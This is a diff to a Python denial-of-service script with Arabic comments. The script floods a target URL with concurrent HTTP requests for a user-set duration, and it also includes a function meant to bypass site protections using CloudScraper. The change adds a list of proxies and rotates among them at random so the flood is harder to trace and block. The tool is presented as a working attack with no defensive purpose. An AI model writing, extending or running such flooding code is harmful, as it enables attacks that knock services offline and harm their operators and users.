@@ -3,7 +3,16 @@ import asyncio
 import time
 import aiohttp
 import httpx
+import random
 from concurrent.futures import ThreadPoolExecutor
+
+# قائمة بروكسيات (يمكنك إضافة المزيد)
+PROXY_LIST = [
+    "http://proxy1.example.com:8080",
+    "http://proxy2.example.com:8080",
+    "http://proxy3.example.com:8080",
+    # أضف المزيد من البروكسيات هنا
+]
 
 # محاولة تجاوز الحمايات باستخدام CloudScraper
 def bypass_protection(target_url):
@@ -83,9 +92,9 @@ def send_request_requests(url, request_counter, response_times, proxy=None):
 
 
 # الوظيفة الرئيسية للهجوم
-async def main(target_url, threads_count, attack_duration, proxy=None):
+async def main(target_url, threads_count, attack_duration, use_proxy=False):
     print("[*] بدء هجوم DoS...")
-    request_counter = [0, 0]
+    request_counter = [0, 0]  # [الطلبات الناجحة, الطلبات الفاشلة]
     response_times = []
     semaphore = asyncio.Semaphore(threads_count)  # التحكم في عدد الطلبات المتزامنة
 
@@ -113,6 +122,9 @@ async def main(target_url, threads_count, attack_duration, proxy=None):
         # تشغيل tasks
         with ThreadPoolExecutor(max_workers=threads_count) as executor:
             while time.time() < end_time:
+                # اختيار بروكسي عشوائي إذا تم تفعيل الخيار
+                proxy = random.choice(PROXY_LIST) if use_proxy else None
+
                 # إضافة مهام aiohttp
                 tasks.append(asyncio.create_task(send_request_aiohttp(target_url, aiohttp_session, request_counter, response_times, semaphore, proxy)))
 
@@ -142,11 +154,6 @@ if __name__ == "__main__":
     threads_count = int(input("أدخل عدد الخيوط (Threads): ").strip())
     attack_duration = int(input("أدخل مدة الهجوم بالثواني: ").strip())
     
-    use_proxy = input("هل تريد استخدام بروكسي؟ (y/n): ").strip().lower()
-    proxy = None
-    if use_proxy == 'y':
-        proxy_address = input("أدخل عنوان البروكسي (مثال: http://proxy.example.com): ").strip()
-        proxy_port = input("أدخل منفذ البروكسي (مثال: 8080): ").strip()
-        proxy = f"{proxy_address}:{proxy_port}"
+    use_proxy = input("هل تريد استخدام بروكسي؟ (y/n): ").strip().lower() == 'y'
 
-    asyncio.run(main(target_url, threads_count, attack_duration, proxy))
+    asyncio.run(main(target_url, threads_count, attack_duration, use_proxy))
